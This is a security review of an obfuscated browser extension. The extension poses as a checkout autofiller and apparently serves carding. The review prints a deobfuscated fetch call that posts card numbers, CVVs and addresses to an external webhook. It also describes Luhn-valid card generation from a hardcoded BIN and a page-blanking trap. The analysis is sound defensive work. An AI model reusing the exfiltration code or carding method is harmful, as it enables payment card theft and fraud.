# Code Review Report: EXSCRIPT-AUTOHITTER

## Executive Summary
This extension poses a **CRITICAL SECURITY RISK**. It contains obfuscated code designed to exfiltrate sensitive user data (credit card details, payment amounts) to an external server. It also exhibits behavior consistent with malicious software (blanking pages, playing audio files named "ransom").

**Recommendation:** DO NOT INSTALL or distribute this extension in its current state. It requires significant cleaning and removal of malicious code.

---

## 1. Security Analysis (Critical)

### 1.1 Data Exfiltration
The `content.js` file contains a hidden function (deobfuscated as `log`) that sends data to an external webhook:
```javascript
fetch("https://hook.eu2.make.com/qdycpuurdqe53njwi1wi3xp9lwyo162h", {
    'method': 'POST',
    'headers': { 'Content-Type': "application/json" },
    'body': JSON.stringify(payload)
})
```
**What is sent:**
- Current URL (filtering for payment/checkout pages like Stripe).
- Payment Amount (`ProductSummary-totalAmount`).
- **Credit Card Details** (Number, CVV, Expiry, Name, Address).
- Extension Status.

### 1.2 Malicious Page Control
`background.js` contains logic to check the title and H1 tag of every active tab.
```javascript
if (currentTitle !== requiredTitle || currentH1Text !== requiredH1) {
    alert('This extension requires the title "EXSCRIPT - AutoCheckouter" ...');
    window.location.href = 'about:blank';
}
```
This logic runs on `tabs.onActivated` and `runtime.onInstalled`. If enabled, it would effectively make the browser unusable on any site that doesn't match the specific "EXSCRIPT" title, redirecting users to a blank page.

### 1.3 Audio Playback
`popup.js` attempts to play a file named `ransom.mp3` immediately upon opening.
```javascript
document.getElementById('audioPlayer').play();
```
While the file is missing from the repo, the name and behavior suggest a prank or intimidation tactic.

---

## 2. Functionality Analysis

### 2.1 Fake Card Generation
The extension generates fake credit card numbers that pass the Luhn algorithm check.
- It uses a hardcoded BIN (`415464440104`) or a user-provided one.
- It generates random addresses and names ("BROKENIST AUTO", "Lakshay gay").
- This functionality itself is often used for testing, but in this context, it appears to be part of a "carding" or "autocheckout" tool.

### 2.2 Form Autofill
The extension attempts to identify and fill payment forms on Stripe and other checkout pages.
- It targets fields like `input#cardNumber`, `input#cardCvc`, etc.
- It simulates typing events to trigger form validation.

### 2.3 UI Injection
- It injects a "Floating Credit" div into the page.
- It injects a "Generate" button on detected checkout pages.
- It displays custom notifications using injected HTML/CSS.

---

## 3. Structural & Code Quality Issues

### 3.1 Broken File Paths
The `manifest.json` file references a directory structure that does not exist in the repository:
- `background.service_worker`: `js/background.js` (Actual: `./background.js`)
- `content_scripts`: `js/content.js` (Actual: `./content.js`)
- `icons`: `icons/icon.png` (Missing)

**Impact:** The extension will fail to load in Chrome/Edge/Brave.

### 3.2 Missing Assets
- `icons/icon.png` (Referenced in manifest)
- `icons/iconi.png` (Referenced in content script)
- `ransom.mp3` (Referenced in popup)

### 3.3 Obfuscation
All JavaScript files (`background.js`, `content.js`, `options.js`, `popup.js`) were heavily obfuscated using string array rotation and hex encoding. This is a strong indicator of malicious intent or an attempt to hide the source code from review.

### 3.4 Unsafe DOM Manipulation
The code frequently uses `innerHTML` to inject content (notifications, buttons).
- Example: `notificationDiv.innerHTML = ...`
- This makes the extension vulnerable to Cross-Site Scripting (XSS) if the injected content includes user-controlled input (though in this specific case, most inputs are internal).

---

## 4. Line-by-Line Deobfuscation Summary

### `background.js`
- **Original:** `const _0x30cbea=_0x469b; ...`
- **Function:** Registers listeners for tab activation and installation. Injects `checkTitleAndPrevent` script which enforces a specific page title.

### `content.js`
- **Original:** `const _0x49222d=_0x3f10; ...`
- **Function:** The core logic.
  - Monitors URL for "pay", "checkout", "stripe".
  - keypress listener (`Ctrl+G`, `Ctrl+H`) to trigger autofill.
  - `generateCardDetails`: Generates fake info.
  - `log`: **EXFILTRATES DATA** to `make.com` webhook.

### `options.js`
- **Original:** `function _0x21d1(){ ... }`
- **Function:** Handles the Options page UI.
  - Saves settings to `chrome.storage.sync`.
  - Displays fake "payment history".

### `popup.js`
- **Original:** `function _0x4f41(){ ... }`
- **Function:** Simple script to play audio.

---

## 5. Conclusion
This project appears to be a malicious or "prank" tool disguised as a checkout automation extension. It is **not safe** for use. The code is intentionally obfuscated, broken in structure, and contains data exfiltration logic.
